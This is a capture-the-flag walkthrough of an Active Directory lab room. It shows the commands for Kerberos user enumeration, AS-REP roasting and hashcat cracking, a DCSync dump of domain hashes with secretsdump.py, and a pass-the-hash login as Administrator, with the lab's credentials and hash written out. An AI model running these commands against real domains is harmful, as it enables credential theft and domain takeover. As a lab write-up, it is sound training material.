![](https://i.imgur.com/TCfa5zq.png)

## Enumeration  

Basic enumeration starts out with an **nmap scan**. Nmap is a relatively complex utility that has been refined over the years to detect what ports are open on a device, what services are running, and even detect what operating system is running. It's important to note that not all services may be deteted correctly and not enumerated to it's fullest potential. Despite nmap being an overly complex utility, it cannot enumerate everything. Therefore after an initial nmap scan we'll be using other utilities to help us enumerate the services running on the device.

**Notes_:_** Flags for each user account are available for submission. You can retrieve the flags for user accounts via RDP (Note: the login format is spookysec.local\User at the Window's login prompt) and Administrator via Evil-WinRM.

```bash
❯ nmap -sCV 10.10.48.94 -Pn
```

```bash
Nmap scan report for 10.10.48.94
Host is up (0.29s latency).
Not shown: 986 closed tcp ports (conn-refused)
PORT      STATE    SERVICE       VERSION
53/tcp    open     domain        Simple DNS Plus
80/tcp    open     http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: IIS Windows Server
88/tcp    open     kerberos-sec  Microsoft Windows Kerberos (server time: 2024-06-18 22:10:49Z)
135/tcp   open     msrpc         Microsoft Windows RPC
139/tcp   open     netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open     ldap          Microsoft Windows Active Directory LDAP (Domain: spookysec.local0., Site: Default-First-Site-Name)
445/tcp   open     microsoft-ds?
464/tcp   open     kpasswd5?
593/tcp   open     ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open     tcpwrapped
3268/tcp  open     ldap          Microsoft Windows Active Directory LDAP (Domain: spookysec.local0., Site: Default-First-Site-Name)
3269/tcp  open     tcpwrapped
3389/tcp  open     ms-wbt-server Microsoft Terminal Services
| ssl-cert: Subject: commonName=AttacktiveDirectory.spookysec.local
| Not valid before: 2024-06-17T21:56:11
|_Not valid after:  2024-12-17T21:56:11
|_ssl-date: 2024-06-18T22:11:10+00:00; 0s from scanner time.
| rdp-ntlm-info: 
|   Target_Name: THM-AD
|   NetBIOS_Domain_Name: THM-AD
|   NetBIOS_Computer_Name: ATTACKTIVEDIREC
|   DNS_Domain_Name: spookysec.local
|   DNS_Computer_Name: AttacktiveDirectory.spookysec.local
|   Product_Version: 10.0.17763
|_  System_Time: 2024-06-18T22:11:01+00:00
27356/tcp filtered unknown
Service Info: Host: ATTACKTIVEDIREC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2024-06-18T22:11:05
|_  start_date: N/A
```

#### Questions:

- What tool will allow us to enumerate port 139/445?

![](https://i.imgur.com/Q00LqJt.png)

_answer_: `enum4linux`

- What is the NetBIOS-Domain Name of the machine?

![](https://i.imgur.com/vK4izo9.png)

_answer_: `THM-AD`

- What invalid TLD do people commonly use for their Active Directory Domain?

_answer_: `.local`

## Enumerating Users via Kerberos 

A whole host of other services are running, including **Kerberos**. Kerberos is a key authentication service within Active Directory. With this port open, we can use a tool called [Kerbrute](https://github.com/ropnop/kerbrute/releases) (by Ronnie Flathers [@ropnop](https://twitter.com/ropnop)) to brute force discovery of users, passwords and even password spray!

For this box, a modified [User List](https://raw.githubusercontent.com/Sq00ky/attacktive-directory-tools/master/userlist.txt) and [Password List](https://raw.githubusercontent.com/Sq00ky/attacktive-directory-tools/master/passwordlist.txt) will be used to cut down on time of enumeration of users and password hash cracking. It is **NOT** recommended to brute force credentials due to account lockout policies that we cannot enumerate on the domain controller.

#### Questions:

- What command within Kerbrute will allow us to enumerate valid usernames?

```bash
./kerbrute -h
```

![](https://i.imgur.com/sHb9f35.png)

- What notable account is discovered? (These should jump out at you):

![](https://i.imgur.com/JIXi5eq.png)

```bash
❯ ./kerbrute userenum -d spookysec.local  --dc 10.10.48.94 ~/userlist.txt 
```

![](https://i.imgur.com/5ja7uGD.png)

_answer_: `svc-admin` 

- What is the other notable account is discovered? (These should jump out at you)

_answer_: `backup`

## Abusing Kerberos 

After the enumeration of user accounts is finished, we can attempt to abuse a feature within Kerberos with an attack method called **ASREPRoasting.** ASReproasting occurs when a user account has the privilege "Does not require Pre-Authentication" set. This means that the account **does not** need to provide valid identification before requesting a Kerberos Ticket on the specified user account.

#### **Retrieving Kerberos Tickets**

[Impacket](https://github.com/SecureAuthCorp/impacket) has a tool called "GetNPUsers.py" (located in impacket/examples/GetNPUsers.py) that will allow us to query ASReproastable accounts from the Key Distribution Center. The only thing that's necessary to query accounts is a valid set of usernames which we enumerated previously via Kerbrute.

#### Questions:

- We have two user accounts that we could potentially query a ticket from. Which user account can you query a ticket from with no password?:

from our `kerbrute` Enumeration we already saw the user that `"Does not require Pre-Authentication"` :

![](https://i.imgur.com/AC9dEIn.png)

but if we what to use `impacket GetNPUsers.py` tool here is the command:
```bash
❯ GetNPUsers.py -dc-ip 10.10.48.94 -usersfile validusers.txt spookysec.local/
```

![](https://i.imgur.com/Gpde5GI.png)

![](https://i.imgur.com/miYrRjn.png)

_answer_:  `svc-admin`

- Looking at the Hashcat Examples Wiki page, what type of Kerberos hash did we retrieve from the KDC? (Specify the full name): 

[hashcat_examples](https://hashcat.net/wiki/doku.php?id=example_hashes)
![](https://i.imgur.com/SBtPDO6.png)

_answer_: `Kerberos 5, etype 23, AS-REP`

- What mode is the hash?:

_answer_:  `18200`


- Now crack the hash with the modified password list provided, what is the user accounts passwords?

```bash
hashcat -m 18200 -a 0 hashes.txt passwordlist.txt 
```

![](https://i.imgur.com/nxcyyJI.png)

_answer_:  `management2005`

## Back to the Basics 

With a user's account credentials we now have significantly more access within the domain. We can now attempt to enumerate any shares that the domain controller may be giving out.

#### Questions:

- What utility can we use to map remote SMB shares?:

_answer_:  `smbclient`

- Which option will list shares?:

_answer_:  `-L`

- How many remote shares is the server listing?:
```bash
❯ smbclient -L //10.10.48.94 -U svc-admin 
```

![](https://i.imgur.com/iMZbzsr.png)

_answer_:  `6`

- There is one particular share that we have access to that contains a text file. Which share is it?:
In order to find the permissions associated with every share, we can use [**smbmap**](https://github.com/ShawnDEvans/smbmap):

```bash
smbmap -u svc-admin -p management2005 -d . -H 10.10.48.94
```

![](https://i.imgur.com/HWo4Jux.png)

```bash
smbclient //10.10.48.94/backup -U svc-admin 
```

![](https://i.imgur.com/BWlwVES.png)

_answer_:  `backup`

- What is the content of the file?:

![](https://i.imgur.com/29qiwn0.png)

- Decoding the contents of the file, what is the full contents?:

![](https://i.imgur.com/1psLDKM.png)

## Elevating Privileges within the Domain 

#### **Let's Sync Up!**

Now that we have new user account credentials, we may have more privileges on the system than before. The username of the account "backup" gets us thinking. What is this the backup account to?

Well, it is the backup account for the Domain Controller. This account has a unique permission that allows all Active Directory changes to be synced with this user account. This includes password hashes

![](https://i.imgur.com/OPkFsf8.png)

Knowing this, we can use another tool within Impacket called "secretsdump.py". This will allow us to retrieve all of the password hashes that this user account (that is synced with the domain controller) has to offer. Exploiting this, we will effectively have full control over the AD Domain.

#### Questions:

- What method allowed us to dump NTDS.DIT?
```bash
secretsdump.py -just-dc spookysec.local/backup:backup2517860@10.10.48.94
```

![](https://i.imgur.com/xL8TZ5Z.png)

_answer_:  `DRSUAPI`

- What is the Administrators NTLM hash?:
![](https://i.imgur.com/OEqC54N.png)

- What method of attack could allow us to authenticate as the user without the password?

_answer_:  `Pass The Hash`

- Using a tool called Evil-WinRM what option will allow us to use a hash?:

_answer_:  `-H`


## Flag Submission Panel 

- svc-admin

```bash
xfreerdp /v:spookysec.local /u:svc-admin /p:management2005
```

![](https://i.imgur.com/KoijtVx.png)

- backup 

```
xfreerdp /v:spookysec.local /u:backup /p:backup2517860
```

![](https://i.imgur.com/3mhVtkl.png)


- administrator

```bash
evil-winrm -i spookysec.local -u Administrator -H 0e0363213e37b94221497260b0bcb4fc
```

![](https://i.imgur.com/kWu5L0P.png)

![](https://i.imgur.com/2JRqpcU.png)

## Thanks For Reading
